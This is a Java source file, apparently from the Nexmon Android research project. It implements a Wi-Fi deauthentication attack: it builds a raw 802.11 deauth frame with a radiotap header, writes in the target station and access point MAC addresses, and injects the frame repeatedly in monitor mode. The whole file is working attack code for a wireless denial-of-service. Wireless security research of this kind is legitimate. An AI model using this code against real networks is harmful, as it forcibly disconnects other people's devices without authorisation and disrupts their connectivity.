package de.tu_darmstadt.seemoo.nexmon.stations;

import de.tu_darmstadt.seemoo.nexmon.MyApplication;
import de.tu_darmstadt.seemoo.nexmon.net.FrameSender;

/**
 * Created by fabian on 9/11/16.
 */
public class DeAuthAttack extends Attack {

    private int amountOfPackets;
    private String stationMac;

    public DeAuthAttack(AccessPoint ap, String stationMac, int amountOfPackets) {
        super(ap);
        this.amountOfPackets = amountOfPackets;
        this.stationMac = stationMac;
    }

    @Override
    public String getName() {
        return "DeAuth Attack";
    }

    @Override
    public String getTypeString() {
        return ATTACK_DE_AUTH;
    }

    @Override
    public boolean needsMonitorMode() {
        return true;
    }

    @Override
    public void stopAttack() {
        super.stopAttack();
    }

    @Override
    public int getMaxInstances() {
        return 1;
    }

    @Override
public void doAttack() {
    byte[] deAuthFrame = constructDeAuthFrame(getAp().getBssid(), stationMac);
    AttackInfoString attackInfoString;

    for(int i = 0; i < amountOfPackets; i++) {
        if(isCanceled)
            break;

        attackInfoString = new AttackInfoString();

        if(FrameSender.sendViaSocket(deAuthFrame)) {
            attackInfoString.message = deAuthFrame.length + " bytes injected!\n";
            attackInfoString.messageType = AttackInfoString.ATTACK_UPDATE_SUCCESS;
        } else {
            attackInfoString.message = "Error, look at logcat!";
            attackInfoString.messageType = AttackInfoString.ATTACK_UPDATE_ERROR;
        }

        updateAttackText(attackInfoString.message, attackInfoString.messageType, getGuid());

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}



    public static byte[] constructDeAuthFrame(String bssid, String station) {
        byte deauth_frame[] =
                {
                        0x00, 0x00, 0x0c, 0x00, 0x04, (byte) 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, /* Radiotap */
                        (byte) 0xc0, 0x00, 0x3a, 0x01, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xa0, (byte) 0xf3, (byte) 0xc1, (byte) 0xf5, 0x58, 0x22, /* Deauth */
                        (byte) 0xa0, (byte) 0xf3, (byte) 0xc1, (byte) 0xf5, 0x58, 0x22, (byte) 0xf0, 0x00, 0x07, 0x00
                };

        String bssidString[] = bssid.split(":");
        String stationString[] = station.split(":");

        byte bssidByte[] = new byte[6];
        byte stationByte[] = new byte[6];

        for (int i = 0; i < 6; i++) {
            bssidByte[i] = (byte) MyApplication.hex2decimal(bssidString[i]);
            stationByte[i] = (byte) MyApplication.hex2decimal(stationString[i]);

            deauth_frame[16 + i] = stationByte[i];
            deauth_frame[22 + i] = bssidByte[i];
            deauth_frame[28 + i] = bssidByte[i];
        }

        return deauth_frame;
    }
}
